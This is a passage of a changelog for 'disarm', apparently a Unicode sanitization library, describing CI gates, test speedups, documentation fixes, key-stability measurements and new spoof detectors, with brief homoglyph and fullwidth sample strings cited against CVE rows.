  `docs/security/cve-validation.md` named five entry points that raised `AttributeError`
  on the release it was describing — `is_case_fold_stable`, `find_key_collisions`,
  `unmapped_confusables`, `find_unmapped_confusables` and `CONFUSABLES_VERSION`.

  A `mkdocs` hook (`scripts/mkdocs_build_banner.py`) stamps the banner onto all 91 pages.
  The version comes from PyPI when the docs workflow can reach it and from
  `pyproject.toml` otherwise, so a local `mkdocs serve` shows the same banner a deploy
  does.

- **A scheduled job that checks the documentation against the published wheel (#641).**
  `scripts/check_docs_against_release.py` collects every `disarm` name the docs use
  (imports and attribute access in Python blocks, `::: disarm.x` mkdocstrings directives,
  inline code spans in prose) and fails when one of them does not exist in the installed
  package. Run against `0.13.0` it reproduces all five names above; against `0.14.0` it
  is clean.

  It runs weekly rather than on pull requests, because documentation ships with the
  feature it documents and a PR gate would block every feature branch for doing that
  correctly. A red run means documented API has outrun the last release.

  Names it cannot fix are allowlisted, and only against an open issue. The gate fails when
  a listed name starts resolving, and a test fails when the page that named it is gone, so
  the list shrinks rather than accumulating — it did so in this same release. What remains
  is `LANG_AUTO`, the one `LANG_*` constant of 84 that the package never re-exports even
  though three doc blocks tell readers to import it (#660, found by this gate on its first
  run).

- **Nothing checked that an installed artifact imports and runs; now two jobs do (#667,
  #669).** Every existing gate tested a development environment. CI built a wheel,
  installed it, then installed the project again from source with its test extras on top,
  so what pytest imported afterwards was not reliably the wheel that was built and the
  wheel was never imported alone. The local pre-push gate uses `maturin develop`, which
  produces no distributable artifact at all.

  `scripts/smoke_installed.py` is the shared body: import `disarm`, assert `__version__`
  is not the `"0.0.0+unknown"` missing-metadata fallback, call one function per public
  surface, and pin the one documented path that raises on every released artifact
  (`transliterate(..., context=True)`, whose message names `bootstrap_dicts.sh`). It
  imports nothing outside the standard library, so it runs in a virtualenv holding the
  artifact and nothing else — the environment in which a missing runtime dependency is
  detectable at all. It also refuses to pass when a source tree shadows the install, which
  is how such a check silently tests nothing.

  `.github/workflows/smoke.yml` runs it twice. The **tracked-tree** job exports
  `git archive HEAD`, installs it and runs the smoke body, on every push to `main` with no
  paths filter — `ci.yml` triggers on `pull_request` only, so the commit that lands was
  the one commit nothing built. The **artifacts** job builds a wheel and an sdist and
  installs each into a clean virtualenv; the sdist had no coverage anywhere, having been
  built at publish time and never installed.

  Verified locally before landing, against real installs rather than in principle: the
  sdist builds from source and passes all 14 checks, and so does the tracked tree. Both
  were sound, so the gates encode a true invariant rather than papering over a break.

- **Key-builder output is gated, not just promised (#644).** `0.14.0` stated the contract —
  a patch release never changes `search_key`, `catalog_key` or `sort_key` output; a minor
  release may — and said plainly that nothing enforced it.
  `tests/test_key_stability.py` does now: eight key-producing functions recomputed over a
  fixed 22,878-row corpus, failing with a per-function count and a sample of what moved.

  Review was not enough, and the history is the argument. `0.14.0` moved `search_key` on
  4.1% of a 5,030-input corpus, and the change responsible (#602) was a correctness fix
  whose diff said nothing about keys — it stopped `ErrorMode::Preserve` excepting itself
  from the table's empty mappings. Nobody reading that diff would have thought *reindex*.

  Checked against the published `0.13.0` wheel the gate reproduces exactly that movement:
  `sort_key` 3,026 rows of 22,878 (13.23%), `canonicalize_strict` 604, `search_key` and
  `catalog_key` 267 each, down to `strip_obfuscation` at 164. Every one is a correctness
  fix, which is the point rather than a complication — `banĸ.example` really should become
  `bank.example`, and it still invalidates a stored key. The gate does not judge whether a
  change is right; it makes the change visible and forces somebody to decide.

  Two properties of the fixture are recorded rather than hidden, in
  `tests/fixtures/key_stability/README.md`. The corpus is **not reproducible** — its
  natural rows are tokenised from randomly sampled Wikipedia titles, so the committed file
  *is* the fixture, while the derived keys regenerate deterministically from it. And its
  **licence is not the repository's**: `corpus.txt` is CC BY-SA 4.0 with attribution, where
  the rest of disarm is MIT.

  What is still missing is a signal a consumer can assert in their own CI. That is
  `KEY_SCHEMA_VERSION` (#645), and it is downstream of this: a constant only means
  something once something detects that the thing it counts has moved.

- **An execute-only doc tier, so no page has a runnable example that nothing runs (#656).**
  Before it, a page could be in three states: on `EXECUTED_RECIPES` with its assertions
  checked, carrying no `python` blocks at all, or — the invisible one — carrying blocks
  that **nothing executed**. Eight pages were in the third state, so a signature change
  could break a published example in silence.

  `EXECUTE_ONLY_RECIPES` runs those blocks and checks nothing else. That claims less than
  the assertion list on purpose, and leaves the ratchet exactly as it was: a page still
  joins `EXECUTED_RECIPES` only once its examples assert rather than decorate.

  Getting the seven pages to pass took five different fixes, because the blocks failed for
  five different reasons. Three fragments on `limitations.md` needed the imports the page
  never made; `architecture/pipeline.md` needed a `dataset` to iterate. Three genuinely
  cannot run and now say so: `api/index.md` uses mypy's `reveal_type`, `api/encoding.md`
  ends on a call it documents as raising, and `migration/index.md` imports a comparator
  from the `bench` extra.

  `tests/test_doc_recipe_coverage.py` keeps the third state gone, which the tier cannot do
  for itself — a new page joins the tree without touching either list. The doc-test runner
  now covers **39** pages, up from 32.

### Fixed

- **Four CI workflows built a dev-profile wheel and then tested it (#658).** `maturin
  build` defaults to the dev profile. `--release` was missing from `ci.yml`'s `test` and
  `doc-tests` jobs, from `tier3.yml`'s formal-invariant build, and from `bench.yml`, while
  `nightly-hypothesis.yml` and `perf-gate.yml` already passed it — so the convention
  existed and these four sat outside it.

  Measured on one machine with one selection: the CI Python job takes **129s against a
  debug wheel and 17s against a release one**. The extra compile time is repaid several
  times over by the test run it feeds.

  `bench.yml` was wrong rather than merely slow. It built a debug wheel and ran
  `benchmarks/bench_quick.py` against it, so the numbers that job printed described an
  unoptimized build. A benchmark whose output cannot be compared to anything is not a
  smoke test of the artifact the project ships.

  No published artifact was affected: `publish.yml` has always passed `--release` to
  `maturin-action`, so every wheel on PyPI is an optimized build.


- **Six CVE rows report and the matrix showed a dash (#665).** `docs/security/cve-validation.md`
  is generated from a registry, gated against it by `TestDocsMatrixDrift`, and understated
  disarm's own detection on six of its 46 rows. The gate was comparing the page with the
  registry; the registry was what was wrong.

  The root cause is one missing dictionary entry. `DISPOSITION_LABELS` had a label for
  `{not-affected, detected}` and none for `{out-of-scope, detected}`, so adding `DETECTED`
  to an out-of-scope row raised `KeyError` and the combination could not be written down at
  all. Four rows gained their signal with `compat_fold` (#633); two — CVE-2026-28289's
  leading zero-width space and CVE-2024-3098's fullwidth `__import__` — reported before
  that and had never been recorded.

  A carve-out in `test_detectors_are_exactly_those_that_fire` skipped out-of-scope rows
  entirely, on the reasoning that a predicate might fire *incidentally* and noticing a
  character is not defending a CVE. Measured against the registry, no such row exists: all
  six fire on the mechanism the CVE exploits — the fullwidth solidus that **is** the path
  bypass, the zero-width space that **is** the upload bypass. The carve-out was suppressing
  six real signals to guard a case that does not occur, so every row is compared now.

- **Two published counts that did not add up (#665).** `25 + 14` misses 46, and
  `15 + 2 + 1` misses 14; the correct census is 25 compared, 15 out of scope, 5 not
  affected, 1 detected-only. That sentence had been wrong since before `0.14.0`. The most
  recent detection total a reader met was also stale: `has_anomalies` reports **24** of the
  46 rows, not the 19 it reached after #612.

  Both numbers are now derived checks rather than prose. `TestDocsMatrixDrift` parses the
  sentences and compares them with the registry, and requires the arithmetic to reconcile
  with itself so a future edit cannot make each number individually right and the sum
  wrong.

- **Eight detector claims were verified by nothing (#665).** `DETECTOR_PANEL` covers 33 of
  the 41 claims on the page. The rest are surface-specific — `is_suspicious_hostname`,
  `inspect_anomalies`, `is_case_fold_stable` — and were checked only by hand.

  `SURFACE_DETECTORS` now records what *firing* means for each, because they do not all
  report the same way: `is_suspicious_hostname` returns a tuple, and `is_case_fold_stable`
  signals a problem by returning `False`. They are checked in one direction only, since
  running a hostname predicate over a source-code probe would manufacture coverage. A
  companion test fails if a claim ever names something neither table knows how to check.

- **`docs/index.md` had drifted from the README it is generated from, in both directions
  (#656).** The file carries a "do not edit directly" banner and is produced by
  `scripts/generate_docs_index.sh` from `README.md` + `docs/_index_nav.md`. Nothing ran the
  generator and nothing checked its output, so the banner was the only thing holding the
  line.

  Two *Features* bullets existed only in the generated file, where the next run would have
  deleted them. A Node.js *Getting Started* entry, a whole-script-spoof example and a
  coverage-residue note existed only in the sources and had never reached the published
  site. The second kind is the one that reads as working: the change appears on GitHub, and
  the docs site quietly does not move.

  Both reconciled — the orphaned bullets moved into `README.md`, everything else
  regenerated — and `scripts/generate_docs_index.sh --check` now fails when the three files
  disagree. It runs in CI's `doc-tests` job rather than `test`, because `test` is gated on
  a path filter that does not include `**.md`, so a README-only pull request would have
  skipped it.

  **This is also what executes the README.** All ten of its `python` blocks land in
  `docs/index.md`, which is first on `EXECUTED_RECIPES` and runs under Sybil on every CI
  run. In sync, the most-read file in the project has its examples asserted; out of sync,
  it does not. `tests/test_docs_index_drift.py` pins both halves, including that the check
  can fail and that the generator is idempotent.

- **`README.md` opened with the wrong function (#656).** Its first runnable block reached
  for `strip_obfuscation`, `normalize_confusables` and `is_suspicious_hostname` — three
  narrow tools — while most readers arrive wanting to clean untrusted input, which is
  `canonicalize`. That name appeared in no runnable block anywhere near the top.

  `canonicalize` now leads the block and the *Which function do I want?* table, with the
  specialists below it. Being in a generated, executed page, both new lines are asserted
  rather than decorative.

- **The test suite spent most of its time on two tests and a serial loop (#658).** Item 1
  landed earlier — `--release` on four `maturin build` calls, which took CI's Python job
  from 129s to 17s. The rest of the issue is here.

  `TestBatchReleasesGil` was 112.6s of that 129s: 87% of the job in two tests. Both assert
  a *ratio*, so the batch only has to be large enough that per-call overhead does not blur
  it. Measured across sizes, the speedup is flat at ~1.8x from 21.6M characters down to
  0.5M, against a 1.3x threshold. Sized to 4.3M with rounds cut from 5 to 3 — deliberately
  not the smallest that works, because CI runners have fewer cores and noisier neighbours
  than the machine this was measured on. The pair now takes 0.39s, and ran ten times
  without a flake.

  `scripts/run_doc_tests.py` ran 32 pytest processes in sequence for about 4.6s of actual
  assertions. The pages are independent — that is why they get separate processes — so the
  loop is concurrent now: **6.5s to 1.7s**. Output is buffered and only failures print
  theirs, in allowlist order, so a concurrent run reads like a serial one.
  `DISARM_DOC_TEST_JOBS=1` restores the serial behaviour.

  The oracle suite emitted 42,457 `DeprecationWarning`s on a full run, from exercising the
  three deprecated aliases against every generated input. Filtered by name in that module
  — not globally, which would also hide deprecations from dependencies, the ones a
  maintainer wants to see.

- **Bare `pytest` now runs what CI runs (#658).** The Hypothesis tier was in the local
  default and in no CI job, so a contributor paid ~67s per run for a tier
  `nightly-hypothesis.yml` already exercises every night with a random seed and a 10×
  oracle budget. And the `slow` marker described itself as deselectable while nothing
  deselected it, so it had no effect: both things it covers are gated elsewhere, and one
  costs a cold `cargo` build on the first run after a Rust change.

  Both are one command away — `pytest -m hypothesis`, `pytest -m slow` — and `pytest-xdist`
  is in the `test` extra for `pytest -n 2 --dist loadfile`. `--dist loadfile` is not
  optional: `register_lang` mutates process-global state that cannot be undone, so tests
  must stay grouped by file.

  CI keeps its serial command. Measured after the fixes above: serial 6.1s, `-n 2` 4.9s,
  `-n auto` 5.4s — `auto` is *worse*, because once the suite is short enough, worker
  startup dominates. The ~1s does not pay for installing the plugin.

  `CONTRIBUTING.md`'s tier figures were stale in both directions and are now measured:
  ~1,025 Rust tests rather than ~630, ~4,490 Python rather than ~2,200, and the Hypothesis
  tier 587 tests / ~67s rather than "~440 / ~40s".

- **Three exhaustive test targets moved from release-time to PR CI, and one of them had
  never run at all (#658 item 7).** `exhaustive_transliterate`, `exhaustive_grapheme` and
  `width_conformance` cover the full BMP, every Hangul syllable, all CJK ideographs, 15
  Indic blocks, grapheme-boundary integrity, and every Unicode scalar for width bounds.
  They ran only in `tier3.yml`, which `publish.yml` calls — so a regression in any of it
  surfaced on the release pull request rather than on the one that caused it, and the
  reason recorded for that placement was cost.

  The cost is 0.62s. The `test` job already builds the debug profile these binaries need,
  so nothing is compiled twice. (Release would run them in 0.07s and need a whole second
  build profile, which costs far more than the 0.55s it saves.)

  `width_conformance` was worse than that: it appeared in no workflow and in no documented
  gate, so **nothing had ever run it**. `exhaustive_confusables` stays in `tier3.yml`,
  where its 1.14s and its need for the release profile belong.

- **`test_cli.py` spawned 58 interpreters to test argument parsing (#658 item 6).** It was
  2.73s of a 6.16s suite, and roughly 4.6s of the 5.2s originally measured was interpreter
  startup. Every test routed through one `run_cli` helper, so the conversion is in the
  helper: it now patches `sys.argv`, `sys.stdin`, `sys.stdout` and `sys.stderr`, calls
  `main()`, and turns `SystemExit` into a returncode. **No test body changed.**

  **58 tests, 2.73s → 0.08s.**

  Four subprocesses remain, in `TestProcessEntryPoint`, and they are the reason this is a
  split rather than a wholesale conversion. An in-process suite passes just as happily when
  `python -m disarm` no longer resolves, when `__main__.py` fails to import under a fresh
  interpreter, or when the console-script entry point is wrong. Those four assert exactly
  that, and nothing else.

  Verified the conversion did not hollow the tests out: planting a `RuntimeError` in
  `cmd_transliterate` turns **34** of the 62 red, across both paths.

- **`fuzz/` deleted, and `SECURITY.md` no longer claims something the code did not support
  (#679).** The four `cargo-fuzz` targets have not compiled since the June presets rename:
  every one imports `_disarm`, and the crate is `disarm`. Three also reach
  `pub(crate)` modules that an external crate cannot see. Confirmed with `cargo check` —
  `error[E0433]` on all four.

  Nothing was going to notice. There is no `[workspace]` in the root manifest, so no
  root-level `cargo check`, `clippy --all-targets` or `test` reaches the directory, and no
  workflow or script invokes `cargo fuzz`.

  The part that made this more than housekeeping: `SECURITY.md` told vulnerability
  reporters the library "is exhaustively fuzzed", in the paragraph that sets the bar for a
  report. It now names what actually runs — 166 `proptest` properties on every pull request,
  23 Hypothesis fuzz tests over arbitrary text and bytes nightly, and 19 falsifying examples
  pinned across 6 committed regression corpora. That is a stronger claim than the old one,
  and unlike it, one a reader who checks will find.

  `THREAT_MODEL.md`'s "fuzzed and tested for no-panic and linear behavior on hostile bytes
  (#78)" needed no change: it refers to `tests/test_encoding_fuzz.py`, which runs.

### Documentation

- **Key-builder output now carries a stated stability contract (#644).** `0.14.0`'s
  Upgrade notes said *"Whether their output carries a stability guarantee is open
  (#644)"* after a release that moved `search_key`, `catalog_key` and `sort_key`. The
  answer, now written into `docs/RUST_API.md`, `RELEASING.md` and the three docstrings on
  both the Python and Rust surfaces:

  > **A patch release never changes key-builder output. A minor release may.**

  `docs/RUST_API.md`'s data-driven-output clause named `normalize_confusables`,
  `strip_obfuscation`, `is_suspicious_hostname` and the `canonicalize*` presets, and not
  the three functions whose entire purpose is to produce a value you store. They are named
  now, with a *Key stability* section covering what a consumer does at each upgrade.

  The rule is a description rather than a new constraint. Measured across every version
  disarm has published, on 12,285 fixed inputs (`U+0020`–`U+2FFF` plus a word list in 13
  scripts), each release installed from PyPI into a clean virtualenv:

  | transition | | `search_key` | `catalog_key` | `sort_key` |
  |---|---|---:|---:|---:|
  | `0.9.0` → `0.9.1` | patch | 0 | 0 | 0 |
  | `0.9.1` → `0.10.0` | minor | 0 | 19 | 0 |
  | `0.10.0` → `0.11.0` | minor | 62 | 73 | 1021 |
  | `0.11.0` → `0.11.1` | patch | 0 | 0 | 0 |
  | `0.11.1` → `0.12.0` | minor | 0 | 0 | 0 |
  | `0.12.0` → `0.13.0` | minor | 0 | 0 | 0 |
  | `0.13.0` → `0.14.0` | minor | 147 | 148 | 416 |

  Both patch releases moved nothing; three of five minors moved nothing either, which is
  why a consumer could not tell the two apart from outside.

  The golden-corpus gate that would enforce this rather than leaving it to review is still
  open work on #644, and `KEY_SCHEMA_VERSION` (#645) is the signal a consumer could assert
  in their own CI. The document says plainly that neither exists yet.

- **`docs/architecture/emoji-plugins.md` is deleted; it documented a plugin system that
  never shipped (#655).** The page named five pip packages with sizes, a `disarm.emoji`
  module with `FileProvider` and `ChainProvider`, and a `disarm-emoji-pack` CLI. None of it
  exists, on `main` or on PyPI, and the page sat in `architecture/` alongside descriptive
  pages with nothing to tell a reader which it was. Its only marker was a
  `<!--- skip: next -->` comment, invisible in the rendered page — the one place a reader
  never looks.

  The shipped provider API is unaffected and was already documented elsewhere:
  `EmojiProvider` in `docs/api/enums.md`, `set_emoji_provider` in `docs/api/transforms.md`,
  and the per-call → global → built-in resolution order in
  `docs/architecture/emoji-engine.md`. That page gains the deleted one's scope statements
  (no emojize, no rendering, no sentiment scoring, no platform rendering history, no
  versioned emoji data) plus a note on the bundled CLDR vintage.

  The unbuilt design is preserved in #662 rather than thrown away: versioned emoji provider
  packages, a file-based provider, and chaining for mixed-era corpora, which is the piece
  with no workaround today.

  Found independently by the drift gate added in #641 on its first run. Deleting the page
  took its allowlist entries with it, leaving only #660.

- **The migration guides now say which library to install (#657).** All seven import the
  module they compare against (`anyascii`, `pathvalidate`, `slugify`, `unidecode`,
  `text_unidecode`, `confusable_homoglyphs`), and `pip install disarm` brings none of the
  distributions that provide them.
  A reader copying a *Before* block got `ModuleNotFoundError` naming a package they never
  asked for, with no way to tell whether disarm was broken. Six are pinned in the `bench`
  extra, which the note names; `confusable-homoglyphs` is in no extra at all, so that page
  spells out the package.

  It never failed in CI because those blocks carry `<!--- skip: next -->`, which is the
  category of defect that survives a green pipeline.

- **`normalize` says which Unicode version it implements (#642).** disarm normalizes to
  **UCD 17.0.0**, via the `unicode-normalization` crate. A host `unicodedata` on an older
  UCD disagrees for code points assigned in between — swept exhaustively, every scalar
  value against all four forms, a UCD 16.0.0 host diverges on exactly one code point
  (`U+A7F1`, in NFKC and NFKD), and an older CPython on more. Every divergence is disarm
  being more current rather than wrong, but a pipeline that canonicalizes with one and
  validates with the other will disagree about which strings are normalized, and the
  disputed set moves when the deployment's Python is upgraded.

  Stated on the Python and Rust docstrings, in `docs/provenance.md` as a new row, and on
  `docs/security/cve-validation.md` beside the differential assertion that motivated it —
  that assertion holds for its payload and is not true in general. The runtime accessor is
  still missing; that half is #642 and #645.

  All three statements are gated. `unicode-normalization` is a floating `0.1` requirement,
  so a `cargo update` can move the bundled Unicode data with no disarm code change at all,
  and three prose claims would keep naming the old version.
  `tests/normalization_ucd_drift.rs` compares each of them against the crate's own
  `UNICODE_VERSION` const and fails when one falls behind.

- **The CVE page names the `digit_policy` trade (#646).** Its stated purpose is answering
  *which call do I make when I don't know which attack is coming*, and it mentioned
  `digit_policy` zero times. Under `tr39` a Gurmukhi zero standing in for `o` folds and the
  spoof is caught; under the default it is missed. The cost is that an Arabic-Indic year
  loses its zero to a full stop, which in a path-shaped key is a traversal-adjacent shape.
  Both directions are now asserted examples on an executed page.

  It also records that the flag reaches `normalize_confusables` and nothing else: not the
  presets, not the key builders, not any of the seven profiles. A caller following that
  section's advice cannot select it at all.

- **Corrected language lists and one wrong method name (#628).** The tagline said "bindings
  for Python, Ruby, and more" for a library that ships Rust, Python, Ruby, Node.js, Java,
  Kotlin and a C ABI, and the *Get started in your language* row offered three of them.
  Node.js is added with its existing page; Java and Kotlin get their Maven coordinates and
  a pointer, since their guide is still to be written.

  Two pages read "`analyzeHostname` in Node/Ruby/Java". Ruby spells it `analyze_hostname`,
  and Kotlin was missing. Both corrected.

- **Nine transforms now say what they do not do, measured rather than asserted (#653).**
  Only three carried a scope warning. The six that did not include `ml_normalize`, which
  passes bidi controls, private-use characters and homoglyphs straight through and is
  picked by name for exactly the job it does not do.

  Each new warning states something measured on the published wheel, not a general
  caution. The sharpest is the key builders': their homoglyph collisions are a side
  effect of transliteration rather than a confusable fold, so a lookalike whose script
  romanizes to something other than its lookalike does not collide at all. Cherokee `Ꮃ`
  *looks* like `W` and romanizes to `la`, so `Ꮃorld` keys as `laorld` and never meets
  `world` — in `catalog_key` too, whose confusable step runs after transliteration and
  never sees the character.

  One correction to the issue: `strip_obfuscation` was counted among the six that do not
  warn. It is the best-documented function of the nine; its statements were bold
  paragraphs rather than admonitions, which is what the survey was detecting. Its
  markup-safety paragraph is promoted to a `Warning:` so it renders as one.

- **`has_anomalies` at the seam is documented (#653).** Running it on the *output* of a
  transform reports whether that transform left something behind, needs no new API, and
  appeared nowhere in the docs. `docs/user-guide/anomaly-detection.md` now shows it with
  asserted examples, and states the caveat that makes it usable: a true result means you
  chose the wrong function, a false result means nothing. At the reported 42.6% recall it
  is a useful alarm and a useless all-clear, and a reader who wires it into CI as an
  acceptance test will read "clean" on most of what is not.

- **13 reST directives and 120 reST roles rendered as literal text (#664).** mkdocstrings
  is configured `docstring_style: google`, under which `.. warning::` renders as those
  exact characters and `` :func:`x` `` renders the literal `:func:`. Fifty-six of the
  roles reached the built site that way, across seven API pages. One of them was
  `strip_format`'s markup-safety warning — a threat-model statement rendered as an
  ordinary paragraph with a stray directive at the front.

  Converted to `Warning:` / `Note:` / `Deprecated:` sections and plain code spans, both of
  which render on the site *and* read correctly under `help()`.
  `tests/test_docstring_conventions.py` holds the convention, and checks its own patterns
  still match the forms they are for, so it cannot lapse into passing vacuously.
  `RELEASING.md` no longer tells contributors to write `.. deprecated:: X`.

- **The naming rule is written down (#654).** *A public name may describe the operation,
  never the outcome.* `canonicalize`, not `clean`. It was being followed and re-argued
  each time someone proposed `clean()`; `CONTRIBUTING.md` now carries it, with the reason
  (NFKC unmasking makes output *more* dangerous to emit, so a name promising safety would
  be actively wrong) and the one shipped exception recorded — `ml_normalize` is named for
  a use case, which is why its docstring carries the warning above.

  `canonicalize` also gains the sentence that closes the one real findability gap: *"For
  cleaning untrusted input before comparison, this is the entry point. It does not make
  text safe to emit; encode at the sink."* It contains `clean`, `untrusted` and `safe`,
  the three words a searcher uses, and promises none of them.

- **The Java and Kotlin bindings have documentation (#628).** They shipped in `0.13.0` and
  the site never absorbed them: no `docs/java/`, no nav entry, and four lines in the whole
  tree mentioning the binding. A reader arriving from Maven Central had no supported path
  from the artifact to a working example.

  Two pages, deliberately scoped to what no other page can give a JVM reader rather than
  mirroring all 69 methods. `docs/java/getting-started.md` covers the coordinates for
  Gradle and Maven, the JDK 21 floor, the five bundled natives, the exception hierarchy,
  and the two things with no counterpart elsewhere: `Pipeline` and `Lexicon` are
  `AutoCloseable` over native handles, and `hasAnomalies` has no single-argument form.
  `docs/java/api.md` covers the two call styles, the four options builders, the types, and
  a name mapping from the bindings a reader may already know.

  **Every example was run before it was written down**, which is how three of them got
  fixed: `hasAnomalies("...")` does not compile, Kotlin's functions are top-level rather
  than members of a `Disarm` object, and the transliteration scheme is `STRICT_ISO9` rather
  than `ISO9`.

  `BINDINGS.md` carried Java as a *planned* binding with "JNI or Panama (FFM)" as an open
  choice, no Maven coordinates in the artifact table, and no Kotlin row at all. All three
  corrected, and the table's "as of 0.11" alignment note brought to 0.14.
  `bindings/java/README.md` now exists, so the GitHub directory view and the published POM
  `url` reach something.

  Comparing the surface against `generated/parity.yaml` for that page turned up #677: the
  JVM has neither `canonicalizeStrict` nor `stripFormat`, so the two-call recommendation on
  the CVE page cannot be followed there as written — and the parity matrix does not track
  the JVM at all, which is why nothing had noticed.

- **Four doc sites told readers to import a name the package does not export (#660).**
  `LANG_AUTO` is defined in `disarm._enums` and is the one `LANG_*` value of 84 that
  `disarm/__init__.py` never re-exports, so `from disarm import LANG_AUTO` raises
  `ImportError` on every released version. One of the pages framed it as the *type-safe*
  option, which is the opposite of what it is.

  The pages now pass `lang="auto"`, which works and which the same pages already showed
  alongside it, and each says why the constant is absent. Exporting a name is a new
  capability, and no other binding has an equivalent, so the export itself waits for a
  minor release — #660 stays open for it with the lockstep constraint recorded.

  Two of the blocks carried `<!--- skip: next -->`, which is why nothing caught this. Both
  now run under Sybil, verified by planting an assertion failure and watching it fail.

  With this the drift gate's allowlist is **empty**: every `disarm` name the documentation
  uses resolves on the published wheel, with no exceptions carried. The two original
  entries left the way the ratchet intends — one with the page that documented it (#655),
  one when the pages stopped making the claim.

## [0.14.0] — 2026-08-28

### Upgrade notes

- **Stored keys move. If you persist the output of `search_key`, `catalog_key` or
  `sort_key`, this release is a reindex event.** Nothing about the API changed; the
  bundled tables and the presets built on them did. A key you wrote to disk last year
  will no longer compare equal to one you compute today, and no exception will tell you.

  `docs/RUST_API.md` states the general principle — data-driven output is not
  semver-stable — but its list names `normalize_confusables`, `strip_obfuscation`,
  `is_suspicious_hostname` and the `canonicalize*` presets, and **not** the three key
  builders. Whether their output carries a stability guarantee is open (#644). Until it
  is answered, treat this section as the statement of record for what moved.

  Measured against the published `0.13.0` wheel in a clean virtualenv, over 5,030
  inputs — real words in 13 scripts plus random samples across `U+0020`–`U+2FFF`:

  | function | outputs changed | % of corpus |
  |---|---|---|
  | `sort_key` | 497 | 9.9% |
  | `canonicalize_strict` | 491 | 9.8% |
  | `search_key` | 206 | 4.1% |
  | `catalog_key` | 206 | 4.1% |
  | `strip_obfuscation` | 137 | 2.7% |
  | `canonicalize` | 53 | 1.1% |
  | `normalize_confusables` | 49 | 1.0% |
  | `transliterate`, `slugify`, `ml_normalize`, `fold_case` | **0** | — |

  The last row is the useful one: the four entry points most likely to be holding a
  stored value are byte-identical to `0.13.0` on this corpus. If you key on
  `transliterate` or `slugify`, you have nothing to do.

  **What moved, and why each is deliberate:**

  - The key builders stopped leaking 134 characters that `transliterate()` deletes
    (#602). A Cyrillic soft sign was surviving into a supposedly-Latin key, and
    `catalog_key` then folded it onto Latin `b`. Russian words containing `ъ` or `ь`
    are the visible case: `search_key("подъезд")` was `podъezd` and is now `podezd`;
    `catalog_key("Пьеса")` was `pbesa` and is now `pesa`.
  - 153 code points now reduce to an **empty** key where they previously reduced to a
    non-empty one — 59 of them letters, including the Cyrillic hard and soft signs.
    A character the table maps to nothing has no ASCII form; that is the table's
    decision, now applied consistently.
  - `canonicalize_strict` gained the eclipsing-mark rule (#615): a combining mark whose
    own script differs from its base's is now dropped, which is what closes
    CVE-2017-7833. That rule is why it moves as far as it does — 9.8%, second only to
    `sort_key` in the table above, and the largest move of any non-key entry point. The
    idempotency defect #638 fixed was introduced *and* fixed inside this cycle, so it
    never reached a release — if you are upgrading from `0.13.0` you were never exposed
    to it, and `canonicalize_strict("C҉̧")` was already stable there.
  - The confusable table **gained** rows. 31 are attacker-observed mappings TR39 does
    not carry (#597); the rest were being discarded at generation time by a filter that
    ran before the pass which would have made them valid (#593, #595). The visible one
    is the capital sharp S: `normalize_confusables("STRAẞE")` was `STRAẞE` on `0.13.0`
    — unfolded — and is now `STRASSE`, so `STRAẞE` and `STRASSE` finally collide, which
    is what a skeleton is for. Anything keyed on a word containing `ẞ`, `Ꟗ` or `ꞵ` moves.

  **Deciding whether it affects you** — run this against your own corpus rather than
  trusting the percentages above, which are a property of the sample:

  ```python
  # in a venv holding the OLD version, dump keys for your real values
  import disarm, json

  json.dump({s: disarm.search_key(s) for s in my_values}, open("before.json", "w"))

  # then upgrade and compare
  before = json.load(open("before.json"))
  moved = [s for s, k in before.items() if disarm.search_key(s) != k]
  ```

  If `moved` is empty you can upgrade in place. Otherwise re-derive the stored keys
  before comparing new ones against them; there is no migration path that converts an
  old key into a new one, because the change is a re-romanisation and not a mapping.

  Keys computed and compared **within one process** are unaffected either way.

- **`has_anomalies` flags a class it did not flag before.** The `compat_fold` kind
  (#633) reports a token that mixes a Unicode compatibility form with ASCII —
  `ａdmin`, `ｅxample.com`, `＜script＞`. If you alert on `has_anomalies`, expect new
  hits on input that was previously reported clean; `canonicalize` already folded all
  of it, so nothing you were *cleaning* changes, only what you are *told about*.

  It is gated twice to keep ordinary text out — the token must carry an ASCII letter,
  and some non-ASCII character must fold *to* ASCII — so `ＮＨＫ`, `Ｑ＆Ａ`,
  `１９９５年`, `kΩ`, `µF` and `10㎏` are all silent. Measured at 0 false positives on
  a 16-sample corpus of Japanese typography and unit symbols. A token spelled *wholly*
  in a compatibility form (`ｐａｙｐａｌ`) is deliberately not flagged.

  Node callers: the `AnomalyKind` union gained `'compat_fold'`. An exhaustive `switch`
  over it needs a new arm.

### Added

- **`compat_fold` — the last row on the CVE page a character class could close (#633).**
  `canonicalize("＜script＞")` returned `<script>` and `inspect_anomalies("＜script＞")`
  reported clean: the whole class was neutralized and none of it was detected, the same
  asymmetry #603, #605, #610 and #612 each closed for a different character class.

  It lands against an explicit prediction. #612's closing text argued the remaining rows
  each needed a *comparison* between two strings rather than the presence of a character,
  so no further character class would close them. Right about the others, wrong about this
  one: a compatibility fold is checkable per token — compare the token to its NFKC form —
  and what made it hard was never detection but false positives.

  **Two gates, and both were found by something firing rather than by design.** The token
  must carry an ASCII **letter**, and some non-ASCII character must fold *to ASCII*. The
  first draft required only "changes under NFKC" and fired on `kΩ µF resistor`, which an
  existing test caught — the Ohm and micro signs fold to Greek and disguise nothing. The
  second draft required an ASCII *alphanumeric* and fired on `10㎏`, which folds to `10kg`;
  125 code points in `U+3000`–`U+33FF` fold to ASCII, so the squared CJK units were a whole
  class. The disguise case is a *word* spelled half in a compatibility form, and a word has
  letters.

  Reaches five CVE rows, and **four of them are out of scope**. CVE-2007-2688 (Cisco IPS
  fullwidth evasion) becomes `Neutralized + detected`; CVE-2019-9636, CVE-2024-43093,
  CVE-2023-41889 and CVE-2023-52081 keep their disposition — disarm does not parse URLs and
  cannot stop them — but a caller who screens before deciding is no longer told the input is
  clean. `has_anomalies` goes from 19 rows to 24, and the undetected-in-scope set from seven
  to six.

  A token spelled *wholly* in a compatibility form (`ｐａｙｐａｌ`, `１２３`) is deliberately
  not flagged: by character class it cannot be told from `ＮＨＫ`, and a detector that fires
  on `ＮＨＫ` is one a CJK-facing caller switches off entirely.

- **`find_key_collisions` — which of these names are the same name (#620).** The first
  disarm entry point that takes a *collection*. Every other detector is a single-string
  predicate, and a collision is not a property of a single string: `groß.txt` is an
  ordinary German filename, and `аdmin` is only a problem next to `admin`. This is the
  question node-tar's `PathReservations` guard failed to ask before extracting two paths
  into one slot in parallel (CVE-2026-23950), and the one a registry has to ask before
  accepting a second `admin` (CVE-2013-7236). Available in Rust
  (`api::find_key_collisions`, `api::KeyForm`, `api::KeyCollision`), Python, Node
